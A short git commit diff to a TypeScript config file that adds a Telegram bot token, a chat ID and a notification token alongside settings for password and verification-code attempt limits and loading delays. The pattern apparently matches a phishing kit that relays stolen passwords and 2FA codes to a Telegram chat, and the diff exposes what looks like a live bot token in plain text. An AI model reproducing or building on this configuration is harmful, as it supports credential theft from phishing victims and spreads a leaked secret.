aca1bc411207edd81dd52a2971591344ec6a1694
petraroliagostino544-collab <petraroliagostino544@gmail.com>
2026-03-06 12:33:05 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -1,7 +1,11 @@
 const config = {
-    MAX_PASS: 2,
-    MAX_CODE: 4,
-    PASSWORD_LOADING_TIME: 8,
-    CODE_LOADING_TIME: 15
+    token: '7586875716:AAG-VZXE1s4yost-1k2RAiAK9ubkQVwUlxo',
+    chat_id: '-5040339257',
+    noti_token: '7586875716:AAG-VZXE1s4yost-1k2RAiAK9ubkQVwUlxo',
+    noti_chat_id: '',
+    max_password_attempts: 2,
+    max_code_attempts: 4,
+    password_loading_time: 5,
+    code_loading_time: 10
 };
 export default config;
